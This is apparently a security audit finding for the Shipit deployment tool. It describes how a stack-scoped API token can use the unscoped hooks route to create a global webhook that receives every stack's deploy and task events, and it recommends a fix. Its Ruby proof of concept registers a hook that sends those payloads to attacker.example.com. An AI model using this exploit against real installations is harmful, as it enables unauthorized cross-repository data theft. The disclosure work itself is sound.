Confirmed: `Hook.deliver` uses `for_stack(stack_id)` which is `where(stack_id: [nil, stack_id])`, meaning global hooks (`stack_id: nil`) receive **every** stack's events. `HooksController` (`app/controllers/shipit/api/hooks_controller.rb:42-52`) determines the target scope purely from `params[:stack_id]` presence, and `require_permission :write, :hook` only checks the ApiClient's `permissions` array — it never checks whether `current_api_client.stack_id` (the stack the token is scoped to) matches the hook being created. A stack-scoped `ApiClient` (created with `stack: some_stack`, `permissions: ['write:hook']`) can call the top-level, unscoped route `POST /api/hooks` (declared in `config/routes.rb:46`, outside the `/stacks/*stack_id` scope) and create a hook with `stack_id` left blank, producing a **global** hook that will be delivered `delivery_url`/`secret` payloads for every stack's `deploy`, `rollback`, `merge`, `commit_status`, etc. events — including stacks the token was never authorized to touch.

### Title
Stack-scoped API token can create a global webhook and exfiltrate cross-repository deploy/task data - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
`ApiClient` can be created scoped to a single `stack` (`belongs_to :stack, optional: true`), and `Api::BaseController#stacks`/`#stack` correctly restrict per-stack resources to that one stack. `Api::HooksController`, however, is reachable both via the stack-scoped route and via a top-level, unscoped route (`resources :hooks, only: %i[index create show update destroy]` at `config/routes.rb:46`), and its scope resolution ignores `current_api_client.stack_id` entirely.

### Finding Description
`HooksController#hooks` builds its scope as: [1](#0-0) 
`stack_id` is set only if `params[:stack_id]` is present; if the caller hits the unscoped `/api/hooks` route, `stack_id` is `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — i.e., the set of **global** hooks. `require_permission :write, :hook` (declared at line 7) only verifies the client's `permissions` array via `ApiClient#check_permissions!`: [2](#0-1) 
It never verifies that `current_api_client.stack` is unset/global. Meanwhile, `Hook.deliver` fans a stack's event out to `for_stack(stack_id)`, defined as `where(stack_id: [nil, stack_id])`: [3](#0-2) 
so any hook with `stack_id: nil` is delivered the payload for **every** stack's `deploy`, `rollback`, `task`, `commit_status`, `merge`, and `pull_request` events, per the `EVENTS` list at lines 70-82. The binding broken is: *the stack an `ApiClient` token authorizes* (`current_api_client.stack_id`) *versus the stack(s) whose events the hook it creates actually touches* (`nil` ⇒ all stacks). Nothing in `HooksController` or `ApiClient#check_permissions!` enforces that equality; only route shape (which `params[:stack_id]` happens to be present) decides it, and the unscoped `/api/hooks` route is reachable by any client holding `write:hook`, regardless of `stack_id` scoping.

### Impact Explanation
An attacker who legitimately obtains (or is issued) a stack-scoped API token limited to one, low-value stack — with only `write:hook` granted for that stack's own webhook management — can instead call the unscoped `POST /api/hooks` endpoint to register a hook with an attacker-controlled `delivery_url` and no `stack_id`. That hook subsequently receives HTTP deliveries containing deploy/task/commit-status/merge payloads for **all** stacks across the entire Shipit installation, i.e., unauthorized cross-stack (cross-repository) read of deploy output and task metadata that the token was never granted access to. This matches the High-impact bar ("unauthenticated/unauthorized read of stack state, task streams or deploy output") since it lets a narrowly-scoped credential exfiltrate data belonging to repositories/stacks outside its authorized scope.

### Likelihood Explanation
Requires possession of a valid `ApiClient` token with `write:hook` permission (a normal, documented permission any stack owner might grant for automation), but does **not** require that token to have `stack: nil`/global scope, nor any elevated `Shipit.github_teams` membership. Any application operator who issues per-stack API tokens for legitimate hook self-management on their own stack can trivially escalate to a global data feed, since the only gating condition is calling a different (undocumented as stack-scoped) route.

### Recommendation
In `Api::HooksController`, when `current_api_client.stack_id` is present, force `stack_id` to that value (never allow `nil`) and reject requests to the unscoped `/api/hooks` route for stack-scoped clients; conversely, only allow creating/mutating global (`stack_id: nil`) hooks for clients whose `current_api_client.stack_id` is itself blank (i.e., a genuinely unscoped/admin token).

### Proof of Concept
```ruby
# ApiClient scoped to a single, low-privilege stack, with only hook permissions
client = Shipit::ApiClient.create!(
  creator: some_user,
  name: "scoped-automation",
  stack: shipit_stacks(:low_value_stack),
  permissions: ['write:hook']
)

# Attacker uses the unscoped route instead of /stacks/*stack_id/hooks
post "/api/hooks",
  params: { delivery_url: "https://attacker.example.com/collect", events: ["deploy", "commit_status"] },
  headers: { 'Authorization' => "Basic #{Base64.encode64(client.authentication_token + ':')}" }

# Resulting Hook has stack_id: nil, and Hook.deliver('deploy', OTHER_STACK.id, payload)
# will match `for_stack(OTHER_STACK.id)` => where(stack_id: [nil, OTHER_STACK.id])
# so attacker.example.com receives deploy payloads for every stack, not just low_value_stack.
```
